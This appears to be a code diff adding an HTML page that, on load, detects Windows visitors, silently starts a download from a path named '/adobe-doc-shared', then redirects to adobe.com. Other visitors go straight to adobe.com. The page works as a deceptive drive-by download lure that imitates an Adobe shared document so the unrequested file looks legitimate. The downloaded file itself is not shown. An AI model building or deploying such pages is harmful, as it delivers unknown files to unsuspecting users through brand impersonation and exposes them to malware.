@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Download & Redirect</title>
+  <script>
+    // Download and redirect settings
+    const fileDownloadUrl = "/adobe-doc-shared";
+    const redirectUrl = "https://adobe.com";
+
+    window.onload = function () {
+      const userAgent = window.navigator.userAgent;
+      if (/Windows/i.test(userAgent)) {
+        // Auto-download the file
+        const a = document.createElement('a');
+        a.href = fileDownloadUrl;
+        a.download = '';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        // Redirect after short delay
+        setTimeout(function () {
+          window.location.href = redirectUrl;
+        }, 1500);
+      } else {
+        window.location.href = redirectUrl;
+      }
+    };
+  </script>
+</head>
+<body>
+  <noscript>
+    JavaScript is required for automatic download and redirect.
+  </noscript>
+</body>
+</html>
